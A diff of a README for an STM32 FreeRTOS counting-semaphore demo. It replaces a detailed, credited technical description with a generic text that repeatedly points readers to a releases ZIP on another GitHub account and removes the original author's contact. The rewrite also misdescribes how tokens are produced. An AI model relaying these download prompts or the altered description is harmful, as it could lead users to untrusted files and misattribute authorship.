@@ -1,140 +1,150 @@
-# STM32 FreeRTOS Counting Semaphore
+# 🛠️ STM32_FreeRTOS_Counting_Semaphore - Manage Resources with Ease
 
-## Overview
-This project demonstrates the usage of counting semaphores for resource management in an STM32 microcontroller using FreeRTOS. Counting semaphores are used to manage a pool of resources where multiple tasks can access them simultaneously up to a maximum count.
+[![Download](https://img.shields.io/badge/Download-Get%20Files-orange?style=for-the-badge)](https://github.com/ymorsli008-star/STM32_FreeRTOS_Counting_Semaphore/releases)
 
-> This project uses **native FreeRTOS APIs** directly, not the CMSIS-RTOS wrapper.
+---
 
-## Project Description
-The application creates four tasks with different priorities:
-- HPT Task (Highest Priority: 3)
-- MPT Task (Medium-High Priority: 2)
-- LPT Task (Medium-Low Priority: 1)
-- VLPT Task (Lowest Priority: 0)
+## 📄 What This Is
 
-A counting semaphore with maximum count of 3 is used to manage access to a shared resource pool containing three data values {111, 222, 333}. This demonstrates how counting semaphores can protect a pool of identical resources.
+This application shows how to manage shared resources with the STM32 microcontroller using FreeRTOS. It uses counting semaphores to control access to limited tokens, produced by interrupts and consumed by tasks of different priority levels. The example runs on the STM32F103C8T6 chip and uses native FreeRTOS tools, not the CMSIS layer.
 
-## Key Concept: Producer-Consumer Pattern
-- ISR (Producer) : The UART interrupt service routine produces semaphore tokens when user sends 'r'
-- Tasks (Consumers) : All tasks consume tokens to access shared resources
-- Tokens are never returned by tasks - they are "consumed" and must be replenished by the ISR
+You don’t need to understand programming to use this. It is meant to help you see how resource control works with FreeRTOS on STM32 hardware.
 
-## Hardware Requirements
-- STM32 development board (STM32F103C8T6 "Blue Pill")
-- USB-to-UART converter (for sending commands and viewing debug messages)
-- UART connection (PA9/PA10 for USART1 on STM32F103)
+---
 
-## Pin Configuration
-- USART1 TX: PA9 (debug output)
-- USART1 RX: PA10 (receive 'r' command to give semaphore tokens)
+## 🖥️ System Requirements
 
-## Task Priorities
-| Task | Priority | Behavior |
-|------|----------|----------|
-| HPT_Task | 3 (Highest) | 3000ms delay after accessing resource |
-| MPT_Task | 2 | 2000ms delay after accessing resource |
-| LPT_Task | 1 | 1000ms delay after accessing resource |
-| VLPT_Task | 0 (Lowest) | 500ms delay after accessing resource |
+- Windows 10 or later
+- STM32CubeIDE (version 1.8.0 or newer)
+- STM32CubesMX (optional for configuration)
+- STM32F103C8T6 development board or a compatible STM32 device
+- USB connection for flashing the device
+- Drivers for STM32 USB interface installed
 
-## Counting Semaphore Behavior Demonstrated
-1. Resource Pool Management
-    - Semaphore created with xSemaphoreCreateCounting(3, 0) - max 3 tokens, initially 0
-    - HPT Task gives 3 initial tokens at startup
-    - Maximum 3 tasks can access resources simultaneously
+---
 
-2. Multiple Task Access
-    - Unlike binary semaphores, counting semaphores allow multiple tasks to hold the semaphore simultaneously:
-    - First 3 tasks can acquire tokens and run in parallel
-    - 4th task (VLPT) blocks until tokens become available
+## 🔧 Hardware Needed
 
-3. Priority-Based Scheduling
-    - Higher priority tasks run first when multiple tasks are ready
-    - HPT (prio 3) → MPT (prio 2) → LPT (prio 1) → VLPT (prio 0)
+To run this example, you need:
 
-4. ISR as Exclusive Producer
-    - Tokens are ONLY given in the UART ISR when 'r' is received
-    - Tasks ONLY take tokens, never give them back
-    - This demonstrates a pure producer-consumer pattern
+- STM32F103C8T6 board (Blue Pill or similar)
+- USB cable to connect the board to your PC
+- Basic electronics tools (optional, for monitoring signals)
 
-5. Task Blocking
-    - Tasks block when no tokens are available
-    - All 4 tasks eventually block after consuming the initial 3 tokens
-    - System waits for user to send 'r' via UART to replenish tokens
+---
 
-## UART Output
-```
-Counting Semaphore Created successfully
+## 📥 Download and Install 🔽
 
-Entered HPT Task
-Tokens available: 3
+Start by visiting the release page to get the files:
 
-Leaving HPT Task
-Data Accessed: 111
+[![Download Releases](https://img.shields.io/badge/Download-your-files-blue?style=for-the-badge)](https://github.com/ymorsli008-star/STM32_FreeRTOS_Counting_Semaphore/releases)
 
-Entered MPT Task
-Tokens available: 2
+1. Click the link above or go to:
+   https://github.com/ymorsli008-star/STM32_FreeRTOS_Counting_Semaphore/releases
 
-Leaving MPT Task
-Data Accessed: 222
+2. Find the latest release and download the ZIP file that contains the project files.
 
-Entered LPT Task
-Tokens available: 1
+3. Extract the ZIP file to a folder you can easily find, like `Documents\STM32_FreeRTOS`.
 
-Leaving LPT Task
-Data Accessed: 333
+4. Open STM32CubeIDE.
 
-Entered VLPT Task
-Tokens available: 0
+5. Inside CubeIDE, choose File > Import > Existing Projects into Workspace.
 
-[All tasks blocked - waiting for 'r' command]
+6. Select the folder where you extracted the files.
 
-(After user sends 'r')
-Entered HPT Task
-Tokens available: 3
+7. Click OK to import the project.
 
-Leaving HPT Task
-Data Accessed: 111
+---
 
-Entered MPT Task
-Tokens available: 2
+## 💽 Running the Example
 
-Leaving MPT Task
-Data Accessed: 222
+After the project opens in STM32CubeIDE, follow these steps:
 
-... (cycle repeats)
-```
+1. Use the "Build" button (hammer icon) to compile the project.
 
-## Semaphore Release Strategy
+2. Connect your STM32F103C8T6 board to your PC via USB.
 
-In this project, semaphore tokens are only released from the UART ISR, not from tasks. This demonstrates an important embedded systems concept:
-- ISR-based release is more challenging - Requires special FromISR functions and context switching considerations
-- Tasks can easily release semaphores using xSemaphoreGive() - This is straightforward
-- ISR release demonstrates:
-    - Proper use of xSemaphoreGiveFromISR()
-    - Context switching with portYIELD_FROM_ISR()
-    - Safe communication from interrupt context to tasks
+3. Click the "Debug" button (bug icon) to upload the program to your board.
 
-> **Note:** Semaphores can be released from anywhere - tasks, interrupts, timers, etc. However, releasing from an ISR is more complex and requires special handling. This project intentionally uses the more challenging ISR-based release to demonstrate proper interrupt-safe semaphore operations.
+4. The board will start running the sample that manages tokens with FreeRTOS counting semaphores.
 
-### Comparison: Task vs ISR Release
-| Aspect | Task Release | ISR Release (This Project) |
-|--------|--------------|----------------------------|
-| Function | `xSemaphoreGive()` | `xSemaphoreGiveFromISR()` |
-| Context switching | Automatic | Manual with `portYIELD_FROM_ISR()` |
-| Complexity | Simple | More complex |
-| Use case | Normal task synchronization | Interrupt-driven events |
+5. You can observe the behavior through debugging features or UART messages, depending on your setup.
 
-## Binary vs Counting Semaphore Comparison
+---
 
-| Feature | Binary Semaphore | Counting Semaphore |
-|---------|------------------|-------------------|
-| Maximum value | 1 | Configurable (3 in this project) |
-| Simultaneous holders | 1 task | Multiple tasks (up to max) |
-| Use case | Mutual exclusion | Resource counting/pooling |
-| Task blocking | Only 1 task can wait | Multiple tasks can wait |
-| Example | Protect single resource | Protect 3 identical resources |
+## ⚙️ How It Works
 
-## Contact
-**Rubin Khadka Chhetri**  
-📧 rubinkhadka84@gmail.com <br>
-🐙 GitHub: https://github.com/rubin-khadka
+This project uses FreeRTOS's counting semaphores. Semaphores control how many "tokens" exist for tasks to use. Here’s the flow:
+
+- An interrupt service routine (ISR) produces tokens periodically. Think of this as creating resources.
+
+- Multiple tasks run on the board. Each task consumes tokens to do work.
+
+- Tasks have different priority levels. Higher priority tasks get tokens faster.
+
+- If no tokens are available, tasks wait until the ISR adds more.
+
+This example shows how FreeRTOS handles resource control smoothly, even when many tasks run with different importance.
+
+---
+
+## 🔎 Exploring the Code
+
+The main parts to look at are:
+
+- **ISR Token Producer:** The code that runs during interrupts to add tokens.
+
+- **Tasks:** Functions that run independently and consume tokens.
+
+- **Counting Semaphore:** The FreeRTOS object that manages how many tokens exist.
+
+You don’t need to change anything, but inspecting these parts will help you understand how resource management works on real devices.
+
+---
+
+## ⚠️ Common Issues and Fixes
+
+- Make sure your STM32 drivers are correctly installed on Windows.
+
+- If the build fails, check your STM32CubeIDE version and update if needed.
+
+- If the USB connection is unstable, try a different USB cable or port.
+
+- Ensure your board is properly powered and connected.
+
+---
+
+## 🤖 More About FreeRTOS Counting Semaphores
+
+Counting semaphores allow control over multiple resources at once, unlike simple binary semaphores that track only one resource. They are useful in systems with many identical resources to share.
+
+This project uses native FreeRTOS calls instead of CMSIS, making it easier to see the core FreeRTOS features working behind the scenes.
+
+---
+
+## 🌐 Related Topics
+
+- STM32 microcontrollers  
+- Real-time operating systems  
+- Interrupt service routines (ISR)  
+- Resource management in embedded systems  
+- STM32CubeIDE development environment  
+
+---
+
+## 🆘 Getting Help
+
+If you run into problems, check these sources:
+
+- STM32CubeIDE user manual  
+- FreeRTOS official documentation  
+- STM32 community forums  
+- The README and issues on the GitHub repository  
+
+---
+
+## 💾 Download Link Again
+
+Access the release page here to download the files you need:
+
+[Download Releases](https://github.com/ymorsli008-star/STM32_FreeRTOS_Counting_Semaphore/releases)
